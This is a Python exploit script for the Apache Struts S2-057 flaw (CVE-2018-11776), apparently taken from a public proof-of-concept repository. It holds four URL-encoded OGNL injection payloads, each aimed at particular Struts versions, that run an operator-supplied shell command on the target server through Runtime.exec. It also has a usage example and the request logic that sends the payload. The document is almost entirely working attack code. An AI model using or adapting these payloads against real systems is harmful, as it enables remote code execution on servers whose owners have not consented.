import requests
import sys
from urllib import quote

def exploit(url):
    try:
        res = requests.get(url, timeout=10, allow_redirects=False)
        print "[+] HTTP Status: {}".format(res.status_code)
        if res.status_code == 302:
            print "[+] Location: {}".format(res.headers['location'])
            print "[*] Exploit Finished!"
        elif res.status_code == 200:
            print "[+] Response: {}".format(res.text.strip())
            print "[*] Exploit Finished!"
        else:
            print "[!] Exploit Failed!"
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print """****S2-057 (CVE-2018-11776) Exploit****
Usage:
    exploit.py <url> <command> <action> <payload>

Example:
    exploit.py "http://127.0.0.1/" "touch /tmp/success" "help.action" 1
        """
        exit()
    url = sys.argv[1]
    command = sys.argv[2]
    action = sys.argv[3]
    payload = sys.argv[4]

    payloads = []
    # payload for other version
    payloads.append("%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D----1".format(command))

    # payload for struts 2.3.20, ref. https://www.anquanke.com/post/id/157823
    payloads.append("%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D----2".format(command))

    # payload for struts 2.3.34, ref. https://www.anquanke.com/post/id/157823
    payloads.append("%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D----3".format(command))

    # payload for struts 2.3.34, ref. https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg
    payloads.append("%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D----4".format(command))
    
    for item in payloads:
        index = item.split('----')[1]
        pload = item.split('----')[0]
        if index == str(payload):
            link = "{}/{}/{}".format(url, pload, action)
            print "\n=== Tring payload-{} ===".format(index)
            print "[*] Generated EXP: {}".format(link)
            print "[*] Exploiting..."
            exploit(link)
